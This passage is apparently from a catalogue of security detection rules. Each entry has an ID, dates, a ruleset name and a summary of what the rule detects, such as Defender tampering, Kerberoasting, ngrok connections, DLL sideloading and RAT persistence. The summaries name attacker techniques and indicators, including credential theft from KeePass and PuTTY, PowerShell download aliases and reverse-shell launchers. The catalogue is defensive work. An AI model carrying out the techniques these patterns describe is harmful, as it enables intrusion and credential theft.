    an attack attempt leveraging the PetitPotam method to intercept or manipulate
    authentication processes.
  Updated-Date: '2024_09_03'
1cf98dc2-fcb0-47c9-8aea-654c9284d1ae:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c593322f0265aec129dcfd1155fe4ed
  Ruleset: sigmahq
  Summary: This rule detects the execution of the hdiutil utility on macOS systems
    with the intent to create a disk image. The hdiutil tool is a command-line utility
    used for manipulating disk images, and its invocation with the 'create' command
    is monitored. This activity could indicate an attempt to exfiltrate data, as creating
    disk images is a common method for packaging files for transfer. While legitimate
    use by administrators and users is possible, this behavior should be scrutinized
    to rule out malicious activity.
  Updated-Date: '2024_09_04'
1cfac73c-be78-4f9a-9b08-5bde0c3953ab:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9c5778c25802484db79d4b79a5abe038
  Ruleset: emerging-threats
  Summary: This rule detects malicious activity associated with Operation Wocao, a
    hacking campaign attributed to a Chinese cyber-espionage group. Specifically,
    it identifies the execution of commands and scripts indicative of this group's
    tactics, such as using `checkadmin.exe` to enumerate local administrators, configuring
    the Windows firewall with `netsh advfirewall`, and executing PowerShell scripts
    with bypassed execution policies. Additionally, it monitors for tasks involving
    `win32times`, potential abuse of `devmgr.dll`, obfuscated PowerShell commands,
    and attempts to access credentials stored in KeePass and PuTTY.
  Updated-Date: '2024_09_03'
1d08ac94-400d-4469-a82f-daee9a908849:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e987bfd32d881d2bb4143cafb04234d6
  Ruleset: core
  Summary: This rule detects an executable initiating a network connection to "ngrok"
    tunneling domains. Ngrok is often used by attackers to store their second stage
    payloads and malware. Although communication with these domains can sometimes
    be legitimate, it may also indicate data exfiltration by malicious actors or the
    download of additional harmful content.
  Updated-Date: '2024_09_03'
1d218616-71b0-4c40-855b-9dbe75510f7f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 63e2c8c953c1c009044579a905df4e94
  Ruleset: core
  Summary: This rule detects registry keys associated with NetWire RAT, a type of
    remote access Trojan. NetWire RAT is known for its capabilities to steal data,
    remotely control infected systems, and is often distributed via phishing campaigns.
    The rule focuses on identifying the creation of registry keys within the Windows
    operating system that contain references to "\software\NetWire," suggesting potential
    indicators of compromise by this malware.
  Updated-Date: '2024_09_03'
1d2ab8ac-1a01-423b-9c39-001510eae8e8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1cf7f29801f13f5ac40cf3e66bb99f90
  Ruleset: sigmahq
  Summary: This rule detects suspicious access attempts to the registry key values
    and sub-keys of Azure AD Health service agents using Windows security events.
    Unauthorized access to these registry keys can potentially lead to abuse of features
    provided by these services in the cloud, such as Federation. The rule specifically
    monitors access attempts to the securable object path "HKLM:\SOFTWARE\Microsoft\ADHealthAgent."
    It filters out legitimate processes, such as those associated with diagnostic
    and monitoring agents of Azure AD Health, to reduce false positives.
  Updated-Date: '2024_09_04'
1d61f71d-59d2-479e-9562-4ff5f4ead16b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ff4d4cb3b3363693333561f4c159de20
  Ruleset: core
  Summary: This rule detects suspicious service installation commands on Windows systems
    by monitoring events generated by the Service Control Manager. Specifically, it
    looks for EventID 7045 and examines the ImagePath for indications of potentially
    malicious activity, such as the presence of PowerShell download commands, hidden
    execution flags, temporary directory usage, and other suspicious patterns. This
    is useful for identifying attempts at persistence and privilege escalation by
    attackers.
  Updated-Date: '2024_09_03'
1d7a57da-02e0-4f7f-92b1-c7b486ccfed5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c70aa94249625a51fcab9be164ff94c8
  Ruleset: emerging-threats
  Summary: This rule detects a suspicious DLL load by an "svchost" process based on
    the location and name of the DLL, which may be indicative of the ColdSteel Remote
    Access Trojan (RAT). The identified DLL, loaded from the '\AppData\Roaming\newdev.dll'
    path, is utilized by ColdSteel as a service DLL for its persistence mechanism.
  Updated-Date: '2024_09_03'
1da8ce0b-855d-4004-8860-7d64d42063b1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 97dfb248784f0bd6aa0019a5a260f541
  Ruleset: core
  Summary: This rule detects a segmentation fault error message indicating a crashing
    Apache worker process. The presence of the phrase "exit signal Segmentation Fault"
    in the Apache error log signifies this issue. This condition may have serious
    implications, potentially affecting service availability and signaling possible
    attacks or malfunctions.
  Updated-Date: '2024_09_03'
1dd05363-104e-4b4a-b963-196a534b03a1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 76bbbe59b8773784e6087eaf5ce4c70e
  Ruleset: core
  Summary: This rule detects the execution of the "mofcomp" utility, which processes
    Managed Object Format (MOF) files to add classes and instances to the Windows
    Management Instrumentation (WMI) repository. The detection focuses on instances
    where "mofcomp" is executed as a child process of suspicious shells or scripting
    utilities, or when the command line includes suspicious paths. Attackers may exploit
    this utility to execute malicious MOF scripts, typically aiming for actions categorized
    under defense evasion.
  Updated-Date: '2024_09_03'
1ddaa9a4-eb0b-4398-a9fe-7b018f9e23db:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 47cfbb3489718a1ae3bcaa20b16b99d9
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2023-22518, an improper
    authorization vulnerability in Confluence Data Center and Confluence Server. Attackers
    can exploit this vulnerability to create admin accounts and execute arbitrary
    commands. The detection focuses on suspicious child processes initiated by Tomcat
    processes, specifically those ending with 'tomcat8.exe', 'tomcat9.exe', or 'tomcat10.exe'
    and involving 'cmd.exe' or 'powershell.exe' as child processes, which are indicative
    of known malicious campaigns.
  Updated-Date: '2024_09_03'
1dde5376-a648-492e-9e54-4241dd9b0c7f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5cdcb18e284ecec8a5902f4daffbcd03
  Ruleset: sigmahq
  Summary: This rule detects the execution of "Diskshadow.exe" in script mode to run
    a script with a potentially uncommon extension. It focuses on identifying instances
    where Diskshadow is used in a non-standard way, which could indicate malicious
    activity or misuse. The rule checks for the presence of 'diskshadow.exe' in the
    original file name or image path and looks for a command line that includes the
    '-s' flag, indicating script mode. It then filters out standard file extensions
    such as '.txt'. The aim is to identify suspicious script executions while ignoring
    common false positives, such as legitimate scripts with uncommon extensions.
  Updated-Date: '2024_09_04'
1ddf4596-1908-43c9-add2-1d2c2fcc4797:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb08f0a57e2af2f9039e51a65bb1f163
  Ruleset: emerging-threats
  Summary: This rule detects an exploitation attempt of the OWASSRF variant targeting
    Exchange servers, which utilizes the OWA endpoint to access the PowerShell backend
    endpoint. It focuses on detecting specific HTTP POST requests that return a status
    code of 200, involve URIs containing '/owa/' and '/powershell', and include characters
    '@' or '%40'. The rule excludes known legitimate user agents like 'ClientInfo',
    'Microsoft WinRM Client', and 'Exchange BackEnd Probes'. The detection aims to
    identify unauthorized attempts manipulating Exchange server communication endpoints,
    distinguishing them from false positives such as web vulnerability scanners.
  Updated-Date: '2024_09_03'
1de68c67-af5c-4097-9c85-fe5578e09e67:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17e67ef1063ad111dade7097ea1de225
  Ruleset: core
  Summary: This rule detects access to the `wceaux.dll` file, which is associated
    with WCE (Windows Credential Editor) used for pass-the-hash remote command execution
    on a source host. It specifically monitors for Windows security events with certain
    Event IDs (4656, 4658, 4660, 4663) that indicate interaction with this DLL file.
    This activity is critical to identify as it is often linked to credential access
    attacks.
  Updated-Date: '2024_09_03'
1df8b3da-b0ac-4d8a-b7c7-6cb7c24160e4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fe6f0094cd25b712aeeae615efec621
  Ruleset: emerging-threats
  Summary: This rule detects the installation of malicious services associated with
    the Turla group's second-stage backdoor, as reported by ESET in their Carbon Paper
    analysis. It focuses on identifying incidents logged by the Service Control Manager
    on Windows systems, specifically targeting Event ID 7045 when services with names
    such as 'srservice', 'ipvpn', and 'hkmsvc' are installed. This activity points
    to persistence mechanisms employed by the Turla group.
  Updated-Date: '2024_09_03'
1e0e1a81-e79b-44bc-935b-ddb9c8006b3d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ada75934068ed319552faf95a399aa66
  Ruleset: sigmahq
  Summary: This rule detects the use of the Microsoft-signed script "CL_mutexverifiers.ps1"
    to proxy the execution of additional PowerShell script commands on Windows systems.
    It triggers when certain process creation patterns are observed, specifically
    when the script is executed by PowerShell or similar processes and involves temporary
    directories, such as those typically located in `AppData\Local\Temp\` or `Windows\Temp\`.
  Updated-Date: '2024_09_04'
1e53dd56-8d83-4eb4-a43e-b790a05510aa:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2d06c357f3fb1de8ee879746ecee9a3d
  Ruleset: sigmahq
  Summary: This rule detects instances where the Windows Installer service (msiexec.exe)
    spawns command-line interfaces such as Command Prompt (cmd.exe) or PowerShell
    (powershell.exe, pwsh.exe). It is designed to identify potential privilege escalation
    attempts by monitoring the creation of these processes by msiexec.exe, which typically
    operates within the '\Windows\Installer\' directory and uses '.tmp' files. This
    detection is crucial as it helps to uncover malicious activities that leverage
    the elevated privileges granted to the Windows Installer service to execute arbitrary
    commands or scripts through cmd or PowerShell.
  Updated-Date: '2024_09_04'
1e59c230-6670-45bf-83b0-98903780607e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09b131649504f716c3bb47ef45842503
  Ruleset: sigmahq
  Summary: This rule detects the execution of `gpscript.exe`, a legitimate system
    binary, known as a LOLBIN (Living Off The Land Binary) used to execute logon or
    startup scripts configured in Group Policy. It's often leveraged for defense evasion
    by attackers. The detection focuses specifically on instances where `gpscript.exe`
    is executed with certain command-line arguments, excluding cases where it is legitimately
    run by `svchost.exe` related to network services.
  Updated-Date: '2024_09_04'
1e75c1cc-c5d4-42aa-ac3d-91b0b68b3b4c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 45a812ef7c2fc190bbd3a305356987a5
  Ruleset: sigmahq
  Summary: This rule detects the use of "Squirrel.exe" to download arbitrary files.
    "Squirrel.exe" is a binary that is a component of multiple Electron-based software
    installations such as Slack, Teams, and Discord. The rule focuses on identifying
    process creation events where the image path ends with either "squirrel.exe" or
    "update.exe" and includes specific command line arguments related to downloading
    or updating, such as `--download`, `--update`, and `--updateRollback=`. It also
    looks for command lines that contain the keyword "http". This detection is relevant
    due to its potential misuse for defense evasion and unauthorized execution.
  Updated-Date: '2024_09_04'
1ea13e8c-03ea-409b-877d-ce5c3d2c1cb3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 17756104bf64cd5c9dd18502fe2bf44c
  Ruleset: sigmahq
  Summary: This rule detects suspicious local connections via a named pipe to the
    AD FS configuration database (Windows Internal Database). It identifies potentially
    unauthorized access to sensitive AD FS configuration settings, which are critical
    for signing SAML tokens. The rule triggers when a connection is made using the
    specific named pipe "\MICROSOFT##WID\tsql\query" by tools not typically associated
    with legitimate administrative or system processes.
  Updated-Date: '2024_09_04'
1ec65a5f-9473-4f12-97da-622044d6df21:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f9e89b41d651b15902f01de9ceef2b59
  Ruleset: core
  Summary: This rule detects attempts to disable features of Microsoft Defender through
    the use of PowerShell commands. It focuses on identifying command lines that include
    specific cmdlets like `Add-MpPreference` or `Set-MpPreference`, paired with options
    to disable various Defender features such as archive scanning, real-time monitoring,
    behavior monitoring, and others. Additionally, it checks for encoded command modifications
    that disguise these disabling actions. This helps to identify potential defense-evasion
    tactics often employed by malicious actors to weaken system security.
  Updated-Date: '2024_09_03'
1edd77db-0669-4fef-9598-165bda82826d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 25264f6be104f1240d5f7fd3fe62daec
  Ruleset: core
  Summary: This rule detects a suspicious session in Apache Guacamole where two users
    are present simultaneously, which could indicate unusual or unauthorized access
    behavior. Apache Guacamole is a remote desktop gateway that allows users to access
    their desktops through a web browser. Detecting more than one user in a session
    may suggest an attempt to exploit credential access, potentially leading to security
    breaches.
  Updated-Date: '2024_09_03'
1edff897-9146-48d2-9066-52e8d8f80a2f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 75b34da509a82409c6a8952bd93e3e2d
  Ruleset: sigmahq
  Summary: This rule detects the use of the PowerShell `Invoke-WebRequest` cmdlet
    to access a direct IP, which can be indicative of potentially malicious network
    activity. The rule specifically looks for the execution of PowerShell or PowerShell
    Core (pwsh) and checks if the command line contains aliases for `Invoke-WebRequest`,
    such as `curl`, `iwr`, or `wget`. It further verifies that the command line includes
    a URL starting with digits (indicative of direct IP addresses). This behavior
    is often associated with command-and-control activities.
  Updated-Date: '2024_09_04'
1eeed653-dbc8-4187-ad0c-eeebb20e6599:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 728a805e967d4aee6cb6c9c1cf4b07b8
  Ruleset: sigmahq
  Summary: This rule detects potential SPN enumeration activities using the Setspn.exe
    utility, which is commonly leveraged for Kerberoasting attacks to perform privilege
    escalation. It identifies instances where Setspn.exe is executed and includes
    specific command-line parameters associated with querying or resetting the computer's
    SPN attributes.
  Updated-Date: '2024_09_04'
1f0f6176-6482-4027-b151-00071af39d7e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13e046d65aae07c9dcc465f7127fa9e2
  Ruleset: sigmahq
  Summary: This rule detects the execution of "ConfigSecurityPolicy.EXE," a binary
    associated with Windows Defender that is used to manage Defender settings. The
    binary may be exploited by attackers to upload or download files. The rule focuses
    on identifying instances where this executable is used in conjunction with URLs
    containing 'ftp://', 'http://', or 'https://'.
  Updated-Date: '2024_09_04'
1f1a8509-2cbb-44f5-8751-8e1571518ce2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 834c4b296d065693e201d2a6e90da550
  Ruleset: core
  Summary: This rule detects the execution of the Splwow64.exe process without any
    command line parameters. Splwow64.exe is a Windows component used to allow 32-bit
    applications to communicate with 64-bit print drivers. The absence of command
    line parameters when this process is launched can indicate potentially malicious
    activity, such as defense evasion techniques by adversaries.
  Updated-Date: '2024_09_03'
1f2b5353-573f-4880-8e33-7d04dcf97744:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0ea1b31c785023285441d37a65f57553
  Ruleset: core
  Summary: This rule detects attempts by an attacker to evade detection by modifying
    Sysmon's configuration on a Windows system, specifically by stopping or disabling
    the service. The detection leverages specific states indicating that Sysmon has
    stopped or its configuration state has changed, excluding cases where the service
    has started. These actions could indicate a defense evasion technique by malicious
    actors. However, legitimate administrative actions might also trigger this rule.
    The detection is crucial for identifying potential tampering with system monitoring
    tools like Sysmon.
  Updated-Date: '2024_09_03'
1f32d820-1d5c-43fe-8fe2-feef0c952eb7:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9d6a429e36dc8cc45a2a89dc65d56b1b
  Ruleset: emerging-threats
  Summary: This rule detects the execution of the Emotet Epoch4 loader delivered via
    a ".lnk" file, which was part of a phishing campaign reported in 2022. It monitors
    process creation activities, specifically looking for instances where the parent
    process is 'cmd.exe', 'explorer.exe', or 'powershell.exe', and the image process
    is 'cmd.exe' or 'powershell.exe'. It also checks for command lines containing
    'findstr', '.vbs', and '.lnk'. This detection mechanism is designed to catch the
    execution behavior associated with Emotet infections.
  Updated-Date: '2024_09_03'
1f49f2ab-26bc-48b3-96cc-dcffbc93eadf:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5299d9fd0c4828405ba8536d278af56
  Ruleset: sigmahq
  Summary: This rule detects potentially suspicious keywords in PowerShell scripts
    that could indicate the use of a PowerShell exploitation framework. It specifically
    looks for terms related to .NET reflection, runtime interop services, and process
    manipulation, such as "System.Reflection.Assembly.Load($", "[System.Reflection.Assembly]::Load($",
    "[Reflection.Assembly]::Load($", "Runtime.InteropServices.UnmanagedType", "Runtime.InteropServices.DllImportAttribute",
    "SuspendThread", and "rundll32". These keywords may be used by attackers to execute
    malicious code, manipulate processes, or otherwise exploit the Windows operating
    system.
  Updated-Date: '2024_09_04'
1f6399cf-2c80-4924-ace1-6fcff3393480:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d0e74edbd61507ae6cf0b493f42214f9
  Ruleset: sigmahq
  Summary: This rule detects the use of a PowerShell script that enumerates Active
    Directory to identify computers joined to the domain. It looks for specific script
    block text in PowerShell logs that indicate the creation of a DirectorySearcher
    object, loading of properties, and execution of a search to retrieve the names
    of properties.
  Updated-Date: '2024_09_04'
1f7025a6-e747-4130-aac4-961eb47015f1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce16d012e4b1b7b98e9a8ca15c00ce06
  Ruleset: core
  Summary: This rule detects the creation of a default named pipe associated with
    the DiagTrackEoP proof-of-concept (PoC) tool, which exploits the "SeImpersonate"
    privilege to potentially escalate privileges on a Windows system. DiagTrackEoP
    is designed to abuse specific system privileges, and monitoring for the named
    pipe "thisispipe" can help identify its activity. This detection focuses on Sysmon
    Event IDs 17 and 18 related to named pipe creation.
  Updated-Date: '2024_09_03'
1f978c6a-4415-47fb-aca5-736a44d7ca3d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf4aa9b7fca872fe01ad9c617237e922
  Ruleset: core
  Summary: This rule detects the export of private keys or the installation of new
    certificates on Cisco devices. It specifically looks for the keywords 'crypto
    pki export', 'crypto pki import', and 'crypto pki trustpoint' in the logs. These
    actions could indicate credential access and defense evasion techniques, making
    it important to monitor such activities to prevent unauthorized access or manipulation
    of cryptographic keys and certificates. Whitelisting known good certificates can
    help minimize false positives.
  Updated-Date: '2024_09_03'
1fac1481-2dbc-48b2-9096-753c49b4ec71:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bc3383f47ee0be1d3f35d591aff20e0d
  Ruleset: emerging-threats
  Summary: This rule detects the presence of the `javaw.exe` process within the AppData
    folder, which is indicative of the Adwind RAT (Remote Access Trojan) or JRAT.
    These types of malware are typically used for remote access and control of infected
    systems. The detection is triggered based on specific command line patterns, including
    references to paths within the AppData\Roaming\Oracle directory and executions
    involving `cscript.exe` running `.vbs` scripts, which are behaviors associated
    with Adwind/JRAT activity.
  Updated-Date: '2024_09_03'
1fb76ab8-fa60-4b01-bddd-71e89bf555da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 192c8a32c1f7793e5fb80a615b73f855
  Ruleset: sigmahq
  Summary: This rule detects the use of the 'Pubprn.vbs' Microsoft signed script employed
    to execute commands. The 'Pubprn.vbs' script, commonly associated with administrative
    tasks, can be leveraged by attackers to evade defenses and execute arbitrary code
    on a Windows system.
  Updated-Date: '2024_09_04'
1fbc0671-5596-4e17-8682-f020a0b995dc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba304bb61dde9ace225ff509590c93ac
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "CCleanerDU.dll," a tactic
    often used in defense evasion, persistence, and privilege escalation attacks.
    The detection is triggered when "CCleanerDU.dll" is loaded, excluding cases where
    the DLL is loaded by legitimate CCleaner executables from standard installation
    paths. False positives may arise from non-standard installation paths, requiring
    additional filtering to improve accuracy.
  Updated-Date: '2024_09_04'
1fc0809e-06bf-4de3-ad52-25e5263b7623:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 636807c9b2687b5ab9880717e6b22b73
  Ruleset: core
  Summary: This rule detects connections from routable IP addresses to an RDP (Remote
    Desktop Protocol) listener, which indicates a publicly accessible RDP service.
    This can be a potential security risk as it exposes the server to unauthorized
    access, including brute force attacks or remote exploits. It focuses on identifying
    connections that do not originate from within specified internal or private IP
    address ranges.
  Updated-Date: '2024_09_03'
1fea93a2-1524-4a3c-9828-3aa0c2414e27:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c5f2e02e51f2c77f2daf0986040a961b
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a DLL file named "newdev.dll" in the
    "AppData\Roaming" directory within any user's profile on a Windows system. This
    behavior is associated with the persistence mechanism of the COLDSTEEL Remote
    Access Trojan (RAT), which may be used for maintaining access and evading defenses
    on an infected machine.
  Updated-Date: '2024_09_03'
20228d05-dd68-435d-8b4e-e7e64938880c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0ae7f746512dc94b732a33f55f6260fe
  Ruleset: emerging-threats
  Summary: This rule detects the presence of a decrypted backdoor binary associated
    with the Kapeka Dropper. The dropper conceals the backdoor as a hidden file within
    a folder named "Microsoft" under either "CSIDL_COMMON_APPDATA" or "CSIDL_LOCAL_APPDATA,"
    depending on the process privileges. The filename is typically a random combination
    of 5-6 consonants and vowels, ending with a ".wll" extension to appear legitimate
    and evade detection. Specific targeted filenames in the detection include "\win32log.exe"
    and "\crdss.exe".
  Updated-Date: '2024_09_03'
20384606-a124-4fec-acbb-8bd373728613:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 99804984de627f8762a6849d07e83c27
  Ruleset: core
  Summary: This rule detects suspicious network connections initiated by well-known
    Windows binaries such as regsvr32.exe, rundll32.exe, or dllhost.exe that are executed
    without any command line parameters. These binaries are frequently exploited for
    malicious activities, including defense evasion techniques where malware may use
    them to establish network connections without drawing attention. The absence of
    command line arguments in these cases can indicate an attempt to mask malicious
    behavior.
  Updated-Date: '2024_09_03'
204b17ae-4007-471b-917b-b917b315c5db:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 47e84b4e6db37b83a8dac9a1327fd415
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "del" or "erase" builtin commands
    on Windows systems, specifically when used with wildcard expressions to delete
    files. This behavior is often associated with malware attempting to remove files
    from folders, potentially to eliminate malware traces or delete evidence. The
    detection focuses on command lines containing "del" or "erase" used in combination
    with file extensions like ".dll", ".exe", and others when run by "cmd.exe".
  Updated-Date: '2024_09_04'
2053961f-44c7-4a64-b62d-f6e72800af0d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19af67ee762b8cb1ce2e67604a6ad5fd
  Ruleset: core
  Summary: "This rule detects remote RPC calls that are made to access event log information\
    \ using RPC interfaces identified by specific UUIDs\u201482273fdc-e32a-18c3-3f78-827929dc23ea\
    \ or f6beaff7-1e19-4fbb-9f8f-b89e2018337c. It is triggered by events logged with\
    \ EventID 3 indicating such activities. The intent is to identify potential lateral\
    \ movement or reconnaissance actions using these RPC calls."
  Updated-Date: '2024_09_03'
207b0396-3689-42d9-8399-4222658efc99:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09044d3d2681152f0eb1fe2b08f5b8b9
  Ruleset: core
  Summary: This rule detects unknown programs attempting to escalate privileges to
    the LOCAL SYSTEM level by using command-line flags typically associated with tools
    such as PsExec and PAExec. These tools are commonly leveraged to start programs
    with elevated privileges. The rule looks for specific command-line patterns involving
    the use of `cmd`, `powershell`, or `pwsh` with SYSTEM privileges arguments indicated
    by `-s` or `-i`. It filters out known uses of these tools to help identify potential
    misuse or malicious activity. Common false positives may include administrators
    who rename their tools or software companies that bundle and rename PsExec or
    PAExec to avoid detection.
  Updated-Date: '2024_09_03'
208748f7-881d-47ac-a29c-07ea84bf691d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0978439fd8a44b0caae641b917d4698d
  Ruleset: core
  Summary: This rule detects a suspicious process originating from an Outlook process.
    Specifically, it identifies instances where the parent process is OUTLOOK.EXE
    and the child process matches any of the specified executables, such as AppVLP.exe,
    bash.exe, cmd.exe, cscript.exe, forfiles.exe, hh.exe, mftrace.exe, msbuild.exe,
    msdt.exe, mshta.exe, msiexec.exe, powershell.exe, pwsh.exe, regsvr32.exe, schtasks.exe,
    scrcons.exe, scriptrunner.exe, sh.exe, svchost.exe, wmic.exe, or wscript.exe.
    This setup can indicate malicious activities such as exploiting vulnerabilities
    (e.g., CVE-2022-30190) or misuse of administrative tools for executing unauthorized
    commands or scripts.
  Updated-Date: '2024_09_03'
2092cacb-d77b-4f98-ab0d-32b32f99a054:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7a95219852cd7d67467f7a499ac316d
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading by identifying instances where
    the "vivaldi_elf.dll" is loaded into memory. It specifically looks for the DLL
    file in paths that do not correspond to the legitimate Vivaldi browser application
    directory. This behavior could indicate attempts at defense evasion or privilege
    escalation, as unauthorized DLL sideloading can be used by attackers to execute
    malicious code.
  Updated-Date: '2024_09_04'
20a5ffa1-3848-4584-b6f8-c7c7fd9f69c8:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a4b4737782edecc8afc9cb85d542f235
  Ruleset: sigmahq
  Summary: This rule detects the execution of Ruby scripts using the "-e" flag on
    Windows systems. The "-e" flag allows for the execution of live Ruby code directly
    from the command line, which can be used to launch a reverse shell or execute
    other potentially malicious actions. The rule focuses on identifying processes
    where the image or original file name is "ruby.exe" and the command line includes
    the "-e" flag.
  Updated-Date: '2024_09_04'
20c3f09d-c53d-4e85-8b74-6aa50e2f1b61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c81443f90953a6815c9ac4fff8a81c68
  Ruleset: emerging-threats
  Summary: This rule detects suspicious inline VBScript keywords commonly used by
    the UNC2452 threat group. Specifically, it monitors process creation on Windows
    systems for the presence of keywords such as 'Execute,' 'CreateObject,' 'RegRead,'
    and 'window.close' within command lines. These keywords are indicative of potentially
    malicious activities, including the manipulation of registry entries and scripting
    actions that may be used by attackers to maintain persistence on compromised systems.
    The rule filters out legitimate entries involving the common Windows startup path
    to minimize false positives.
  Updated-Date: '2024_09_03'
20c6ed1c-f7f0-4ea3-aa65-4f198e6acb0f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f956c2326c44225934e5cd7c31e8933b
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit the Sitecore Experience Platform
    through the CVE-2021-42237 vulnerability. Specifically, it monitors POST requests
    to the URL path that includes '/sitecore/shell/ClientBin/Reporting/Report.ashx'
    which return a 200 status code. This pattern indicates potential unauthorized
    remote code execution (RCE) attempts before authentication, as flagged by security
    analysis on Sitecore web servers.
  Updated-Date: '2024_09_03'
20e5497e-331c-4cd5-8d36-935f6e2a9a07:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b2d25f49dd39013f7b5bf1756a4c475
  Ruleset: sigmahq
  Summary: This rule detects the use of obfuscated PowerShell scripts employing compression
    techniques. It specifically identifies scripts that utilize object instantiation
    methods, ASCII encoding processes, and .NET classes related to compression and
    stream reading, concluding with commands that read the complete content. This
    detection method relies on examining the script block logs for these characteristic
    patterns, indicating potential obfuscation tactics employed by attackers for defense
    evasion and malicious execution.
  Updated-Date: '2024_09_04'
20f0ee37-5942-4e45-b7d5-c5b5db9df5cd:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f78793e59a30f3b15f3ff8741d41f17a
  Ruleset: sigmahq
  Summary: This rule detects the modification of autostart extensibility point (ASEP)
    in the Windows registry, specifically changes to keys under the '\SOFTWARE\Microsoft\Windows\CurrentVersion'
    path. It targets various subkeys related to shell service object delay, run, and
    run once entries, among others, which are commonly used for persistence mechanisms.
    The rule filters out benign modifications by legitimate software such as OneDrive,
    Spotify, WebEx, Dropbox, Opera, iTunes, Zoom, Greenshot, Google Drive, and Microsoft
    Teams, among others, to reduce false positives. The detection provides an alert
    when unauthorized changes are made to these critical registry keys, which may
    indicate potential malicious activity or unwanted persistence techniques by malware.
  Updated-Date: '2024_09_04'
20f754db-d025-4a8f-9d74-e0037e999a9a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9e6ae8c0221e7454a196aac4cc82b614
  Ruleset: sigmahq
  Summary: This rule detects the deletion of an SES (Simple Email Service) identity
    via the "DeleteIdentity" event within AWS CloudTrail logs. This activity may indicate
    that an adversary is attempting to remove evidence of suspicious or malicious
    activities carried out using that account.
  Updated-Date: '2024_09_04'
2111118f-7e46-4fc8-974a-59fd8ec95196:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cf3032e2387effda3c2f64adcd0c0642
  Ruleset: core
